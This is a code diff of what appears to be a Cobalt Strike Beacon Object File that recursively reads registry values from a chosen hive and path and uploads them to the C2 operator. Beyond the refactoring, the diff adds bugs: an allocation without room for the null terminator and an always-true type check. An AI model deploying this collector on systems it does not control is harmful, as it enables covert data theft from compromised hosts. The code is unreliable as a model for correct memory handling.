@@ -21,23 +21,36 @@ typedef struct _RegPath {
   wchar_t *value;
 } RegPath;
 
-wchar_t *path_join(const wchar_t *path1, wchar_t *path2) {
-  int path1Length = MSVCRT$wcslen(path1);
-  int path2Length = MSVCRT$wcslen(path2);
-  int totalLength = path1Length + path2Length + 2;
-  wchar_t *joined_path = intAlloc(totalLength * sizeof(wchar_t));
-  if (!joined_path) {
+wchar_t *path_join(const wchar_t *path1, const wchar_t *path2) {
+  wchar_t *new_path;
+  if (MSVCRT$wcscmp(path1, L"") == 0) {
+    int path_length = MSVCRT$wcslen(path2);
+    new_path = intAlloc(path_length * sizeof(wchar_t));
+    MSVCRT$wcscpy(new_path, path2);
+    return new_path;
+  }
+  if (MSVCRT$wcscmp(path2, L"") == 0) {
+    int path_length = MSVCRT$wcslen(path1);
+    new_path = intAlloc(path_length * sizeof(wchar_t));
+    MSVCRT$wcscpy(new_path, path1);
+    return new_path;
+  }
+  int path1len = MSVCRT$wcslen(path1);
+  int path2len = MSVCRT$wcslen(path2);
+  int totallen = path1len + path2len + 2;
+  new_path = intAlloc(totallen * sizeof(wchar_t));
+  if (!new_path) {
     BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory for joined path");
     return NULL;
   }
-  MSVCRT$wcscpy(joined_path, path1);
-  MSVCRT$wcscat(joined_path, L"\\");
-  MSVCRT$wcscat(joined_path, path2);
-  return joined_path;
+  MSVCRT$wcscpy(new_path, path1);
+  MSVCRT$wcscat(new_path, L"\\");
+  MSVCRT$wcscat(new_path, path2);
+  return new_path;
 }
 
-void QueryRegistryPath(Pqueue queue, HKEY hive, const wchar_t *arg_hive,
-                        const wchar_t *key_path, bool recurse) {
+void query_registry_path(Pqueue queue, HKEY hive, const wchar_t *arg_hive,
+                       const wchar_t *key_path, bool recurse) {
   HKEY target_reg_key;
   DWORD rc1, rc2, rc3, rc4;
 
@@ -45,21 +58,21 @@ void QueryRegistryPath(Pqueue queue, HKEY hive, const wchar_t *arg_hive,
                                     KEY_READ | KEY_ENUMERATE_SUB_KEYS |
                                         KEY_QUERY_VALUE,
                                     &target_reg_key)) == ERROR_SUCCESS) {
-    WCHAR achClass[MAX_PATH];      // buffer for class name
-    DWORD cchClassName = MAX_PATH; // size of class string
+    WCHAR ach_class[MAX_PATH];      // buffer for class name
+    DWORD cch_class_name = MAX_PATH; // size of class string
     DWORD num_subkeys = 0;         // number of subkeys
     DWORD max_subkey_length;       // longest subkey size
-    DWORD cchMaxClass;             // longest class string
+    DWORD max_class;             // longest class string
     DWORD num_values;              // number of values for key
     DWORD max_key_length;          // longest value name
     DWORD max_value_length;        // longest value data
-    DWORD cbSecurityDescriptor;    // size of security descriptor
+    DWORD security_descriptor_length;    // size of security descriptor
     DWORD i;
 
     if ((rc2 = ADVAPI32$RegQueryInfoKeyW(
-             target_reg_key, achClass, &cchClassName, NULL, &num_subkeys,
-             &max_subkey_length, &cchMaxClass, &num_values, &max_key_length,
-             &max_value_length, &cbSecurityDescriptor, NULL)) ==
+             target_reg_key, ach_class, &cch_class_name, NULL, &num_subkeys,
+             &max_subkey_length, &max_class, &num_values, &max_key_length,
+             &max_value_length, &security_descriptor_length, NULL)) ==
         ERROR_SUCCESS) {
 
       // Enumerate Subkeys and recurse
@@ -70,9 +83,10 @@ void QueryRegistryPath(Pqueue queue, HKEY hive, const wchar_t *arg_hive,
           if ((rc3 = ADVAPI32$RegEnumKeyExW(target_reg_key, i, subkey_name,
                                             &subkey_name_size, NULL, NULL, NULL,
                                             NULL)) == ERROR_SUCCESS) {
+
             if (recurse) {
               wchar_t *new_key = path_join(key_path, subkey_name);
-              QueryRegistryPath(queue, hive, arg_hive, new_key, recurse);
+              query_registry_path(queue, hive, arg_hive, new_key, recurse);
               intFree(new_key);
             }
           } else {
@@ -93,86 +107,78 @@ void QueryRegistryPath(Pqueue queue, HKEY hive, const wchar_t *arg_hive,
           if ((rc4 = ADVAPI32$RegEnumValueW(
                    target_reg_key, i, key, &key_length, NULL, &value_type,
                    value_data, &value_data_length)) == ERROR_SUCCESS) {
-            RegPath *regPath = (RegPath *)intAlloc(sizeof(RegPath));
-            queue->push(queue, regPath);
-            regPath->type = value_type;
+            RegPath *reg_path = (RegPath *)intAlloc(sizeof(RegPath));
+            queue->push(queue, reg_path);
+            reg_path->type = value_type;
 
             wchar_t *total_path = path_join(arg_hive, key_path);
             size_t total_path_length = MSVCRT$wcslen(total_path);
-            regPath->path_length = total_path_length * sizeof(wchar_t);
-            regPath->path = (wchar_t *)intAlloc(total_path_length * sizeof(wchar_t));
-            MSVCRT$memcpy(regPath->path, total_path,
+            reg_path->path_length = total_path_length * sizeof(wchar_t);
+            reg_path->path =
+                (wchar_t *)intAlloc(total_path_length * sizeof(wchar_t));
+            MSVCRT$memcpy(reg_path->path, total_path,
                           total_path_length * sizeof(wchar_t));
+            intFree(total_path);
 
-            regPath->key_length = key_length * sizeof(wchar_t);
-            regPath->key = (wchar_t *)intAlloc(key_length * sizeof(wchar_t));
-            MSVCRT$memcpy(regPath->key, key, key_length * sizeof(wchar_t));
+            reg_path->key_length = key_length * sizeof(wchar_t);
+            reg_path->key = (wchar_t *)intAlloc(key_length * sizeof(wchar_t));
+            MSVCRT$memcpy(reg_path->key, key, key_length * sizeof(wchar_t));
 
             if (value_type == REG_NONE) {
-              regPath->value_length = 0;
-              regPath->value = NULL;
+              reg_path->value_length = 0;
+              reg_path->value = NULL;
             } else if (value_type == REG_SZ) {
-              regPath->value_length = value_data_length;
-              regPath->value = (wchar_t *)intAlloc(value_data_length);
-              MSVCRT$memcpy(regPath->value, value_data, value_data_length);
+              reg_path->value_length = value_data_length;
+              reg_path->value = (wchar_t *)intAlloc(value_data_length);
+              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
             } else if (value_type == REG_EXPAND_SZ) {
-              wchar_t *raw_value = (wchar_t *)intAlloc(value_data_length);
-              MSVCRT$memcpy(raw_value, value_data, value_data_length);
-              // Use ExpandEnvironmentStringsW to expand the string
-              DWORD expandedSize =
-                  KERNEL32$ExpandEnvironmentStringsW(raw_value, NULL, 0);
-              DWORD total_size = (expandedSize + 1) * sizeof(wchar_t);
-              wchar_t *expanded = (wchar_t *)intAlloc(total_size);
-              KERNEL32$ExpandEnvironmentStringsW(raw_value, expanded,
-                                                 expandedSize);
-              // Copy the expanded string into the value
-              regPath->value_length = total_size;
-              regPath->value = expanded;
-              intFree(raw_value);
-            } else if (value_type == REG_BINARY) {
-              regPath->value_length = value_data_length;
-              regPath->value = (wchar_t *)intAlloc(value_data_length);
-              MSVCRT$memcpy(regPath->value, value_data, value_data_length);
+              reg_path->value_length = value_data_length;
+              reg_path->value = (wchar_t *)intAlloc(value_data_length);
+              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
             } else if (value_type == REG_DWORD ||
                        value_type == REG_DWORD_BIG_ENDIAN) {
-              regPath->value_length = sizeof(DWORD);
-              regPath->value = (wchar_t *)intAlloc(sizeof(DWORD));
+              reg_path->value_length = sizeof(DWORD);
+              reg_path->value = (wchar_t *)intAlloc(sizeof(DWORD));
               DWORD value = *(DWORD *)value_data;
-              MSVCRT$memcpy(regPath->value, &value, sizeof(DWORD));
-            } else if (value_type == REG_LINK) {
-              // TODO
-            } else if (value_type == REG_MULTI_SZ) {
-              regPath->value_length = value_data_length;
-              regPath->value = (wchar_t *)intAlloc(value_data_length);
-              MSVCRT$memcpy(regPath->value, value_data, value_data_length);
+              MSVCRT$memcpy(reg_path->value, &value, sizeof(DWORD));
+            } else if (value_type == REG_BINARY || REG_LINK ||
+                       value_type == REG_MULTI_SZ ||
+                       value_type == REG_RESOURCE_LIST ||
+                       value_type == REG_FULL_RESOURCE_DESCRIPTOR ||
+                       value_type == REG_RESOURCE_REQUIREMENTS_LIST) {
+              reg_path->value_length = value_data_length;
+              reg_path->value = (wchar_t *)intAlloc(value_data_length);
+              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
             } else if (value_type == REG_QWORD) {
-              regPath->value_length = sizeof(QWORD);
-              regPath->value = (wchar_t *)intAlloc(sizeof(QWORD));
+              reg_path->value_length = sizeof(QWORD);
+              reg_path->value = (wchar_t *)intAlloc(sizeof(QWORD));
               QWORD value = *(QWORD *)value_data;
-              MSVCRT$memcpy(regPath->value, &value, sizeof(QWORD));
+              MSVCRT$memcpy(reg_path->value, &value, sizeof(QWORD));
             } else {
               BeaconPrintf(CALLBACK_ERROR, "Unsupported type: %d\n",
                            value_type);
-              regPath->value_length = 0;
+              reg_path->value_length = value_data_length;
+              reg_path->value = (wchar_t *)intAlloc(value_data_length);
+              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
             }
           } else {
-            BeaconPrintf(CALLBACK_ERROR, "Error code: %li\n", rc4);
+            BeaconPrintf(CALLBACK_ERROR, "[WARNING] Error code: %li\n", rc4);
           }
           intFree(key);
           intFree(value_data);
         }
       }
     } else {
-      BeaconPrintf(CALLBACK_ERROR, "RegQueryInfoKeyW returned error: %d\n",
-                   rc2);
+      // BeaconPrintf(CALLBACK_ERROR, "RegQueryInfoKeyW returned error: %d\n",
+      // rc2);
     }
   } else {
-    BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExW returned error: %d\n", rc1);
+    // BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExW returned error: %d\n", rc1);
   }
   ADVAPI32$RegCloseKey(target_reg_key);
 }
 
-void FormatUploadRegistryData(Pqueue queue, char *upload_file_name) {
+void format_upload_registry_data(Pqueue queue, char *upload_file_name) {
   Pitem cursor;
   RegPath *curitem;
   formatp obj;
@@ -220,7 +226,7 @@ void FormatUploadRegistryData(Pqueue queue, char *upload_file_name) {
   queue->free(queue);
 
   out = BeaconFormatToString(&obj, &fmt_size);
-  UploadFile(upload_file_name, out, fmt_size);
+  upload_file(upload_file_name, out, fmt_size);
   BeaconFormatFree(&obj);
 }
 
@@ -238,6 +244,12 @@ void go(char *args, int alen) {
   arg_file_name = BeaconDataExtract(&parser, NULL);
   arg_hive = BeaconDataExtract(&parser, NULL);
   arg_path = BeaconDataExtract(&parser, NULL);
+
+  if (arg_file_name == NULL || arg_hive == NULL || arg_path == NULL) {
+    BeaconPrintf(CALLBACK_ERROR,
+                 "Usage: bof_reg_collect <file_name> <hive> <path>\n");
+    return;
+  }
 
   if (MSVCRT$strcmp(arg_hive, "HKCR") == 0) {
     target_hive = HKEY_CLASSES_ROOT;
@@ -264,10 +276,11 @@ void go(char *args, int alen) {
   path = (wchar_t *)intAlloc(wchars_num * sizeof(wchar_t));
   KERNEL32$MultiByteToWideChar(CP_UTF8, 0, arg_path, -1, path, wchars_num);
 
-  QueryRegistryPath(queue, target_hive, arg_hive_w, path, true);
+  query_registry_path(queue, target_hive, arg_hive_w, path, true);
+
   num_keys = queue->size(queue);
   BeaconPrintf(CALLBACK_OUTPUT, "Total reg keys: %d", num_keys);
   if (num_keys != 0)
-    FormatUploadRegistryData(queue, arg_file_name);
+    format_upload_registry_data(queue, arg_file_name);
   intFree(path);
 }
